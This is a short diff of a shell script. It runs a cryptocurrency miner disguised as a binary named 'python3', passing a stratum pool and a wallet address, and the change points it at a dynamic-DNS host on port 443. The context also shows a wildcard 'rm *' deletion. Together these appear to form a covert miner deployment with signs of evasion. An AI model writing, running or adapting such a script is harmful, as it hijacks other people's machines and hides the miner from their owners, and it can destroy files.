@@ -13,4 +13,4 @@ rm *
 
 cd ~/
 
-./python3 -a  yespowersugar -o stratum+tcp://yespowerSUGAR.sea.mine.zpool.ca:6241 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt -p c=DGB
+./python3 -a  yespowersugar -o stratum+tcp://luckyynr.us.to:443 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt -p c=DGB
